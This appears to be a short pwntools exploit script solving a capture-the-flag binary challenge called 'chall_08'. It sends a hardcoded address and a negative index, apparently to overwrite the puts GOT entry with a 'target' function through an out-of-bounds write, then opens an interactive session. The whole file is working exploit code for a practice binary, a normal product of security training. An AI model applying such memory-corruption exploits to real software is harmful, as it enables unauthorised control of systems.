# coding: utf-8
from pwn import *
pr = process("./chall_08")
elf = ELF("./chall_08")
elf.got.puts - elf.sym.target
pr.sendline("4198950")
pr.sendline("-7")
pr.interactive()
pr.close()
